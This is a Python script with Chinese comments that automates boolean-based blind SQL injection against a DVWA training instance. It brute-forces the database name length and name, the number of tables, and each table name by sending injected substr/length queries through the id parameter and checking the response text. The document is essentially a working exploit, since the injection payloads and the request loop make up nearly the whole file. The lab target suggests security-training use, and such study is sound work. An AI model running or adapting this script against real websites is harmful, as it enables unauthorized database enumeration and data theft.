import requests

# 脚本里用到的参数
# databaseLen   库名长度
# databse_name  库名
# tableNum      表的数量
# tableLen      表名长度
# table_name    表名

s = requests.Session()

url = 'http://192.168.137.128/dvwa/vulnerabilities/sqli_blind/'

payloads = 'abcdefghijklmnopqrstuvwxyz1234567890'


headers = {'Cookie': 'security=low; PHPSESSID=sfscksqa0etaj9cnb2bffkb0n6'}


# 1.先爆破库名的长度，以提高后续循环的效率,也可以不爆破长度，直接爆破名称（只要循环数大于长度）
def Getdatabase_len():
    for j in range(1, 50):
        databaseLen_payload = '?id=1\' and length(database())=' + str(j) + ' %23&Submit=Submit#'
        # 所有payload里的注释#要用url编码表示，因为这是直接添加在url里的
        if 'User ID exists in the database.' in s.get(url + databaseLen_payload, headers=headers).text:
            global databaseLen
            databaseLen = j
            break
    print('数据库名称长度: ' + str(databaseLen))

# 2.爆库名
def Getdatabase_name():
    databse_name = ''
    for j in range(1, databaseLen + 1):
        for i in payloads:
            databse_payload = '?id=1\' and substr(database(),' + str(j) + ',1)=\'' + str(i) + '\' %23&Submit=Submit#'

            if 'User ID exists in the database.' in s.get(url + databse_payload, headers=headers).text:
                databse_name += i
    print('数据库名称: ' + databse_name)

# 3.爆破表的个数
def Gettable_num():
    for j in range(1, 50):
        tableNum_payload = '?id=1\' and (select count(table_name) from information_schema.tables where table_schema=database())=' + str(
            j) + ' %23&Submit=Submit#'
        if 'User ID exists in the database.' in s.get(url + tableNum_payload, headers=headers).text:
            global tableNum
            tableNum = j
            break
    print('表各数: ' + str(tableNum))

# 4.爆出所有的表名
# (1)爆出各个表名的长度
def Gettable_lenname():
    for j in range(0, tableNum):
        table_name = ''
        for i in range(1, 50):
            tableLen_payload = '?id=1\' and length(substr((select table_name from information_schema.tables where table_schema=database() limit ' + str(
                j) + ',1),1))=' + str(i) + ' %23&Submit=Submit#'
            # 用法substr('This is a test', 6) 返回'is a test'
            if 'User ID exists in the database.' in s.get(url + tableLen_payload, headers=headers).text:
                tableLen = i
                print('表' + str(j + 1) + '名称长度: ' + str(tableLen))
                # (2)内部循环爆破每个表的表名
                for m in range(1, tableLen + 1):
                    for n in payloads:  # i在上个循环用过了
                        table_payload = '?id=1\' and substr((select table_name from information_schema.tables where table_schema=database() limit ' + str(
                            j) + ',1),' + str(m) + ',1)=\'' + str(n) + '\' %23&Submit=Submit#'
                        if 'User ID exists in the database.' in s.get(url + table_payload, headers=headers).text:
                            table_name += n
                print('表' + str(j + 1) + '名称: ' + table_name)

Getdatabase_len()
Getdatabase_name()
Gettable_num()
Gettable_lenname()